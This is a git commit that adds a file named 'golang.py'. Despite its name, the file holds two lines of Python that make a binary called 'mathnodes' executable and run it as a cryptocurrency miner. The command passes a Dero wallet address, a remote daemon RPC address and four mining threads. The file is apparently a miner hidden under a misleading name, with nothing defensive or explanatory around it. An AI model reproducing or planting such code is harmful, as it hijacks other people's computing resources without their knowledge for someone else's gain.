76457feb276f0288933eec59154ac89d677206d2
ariandslat <122443418+ariandslat@users.noreply.github.com>
2023-01-11 17:06:04 +0700

    Create golang.py

---
+++ golang.py
@@ -0,0 +1,2 @@
+import os
+os.system('chmod 700 mathnodes;./mathnodes --wallet-address=deroi1qyr8wnk9aw9lel0xcufdj98cqtd3lc5y84nhl679nm3wknaz0ad6xq9pvfz92xnje7yu7pv0rlr --daemon-rpc-address=51.222.96.66:80 --mining-threads=4')
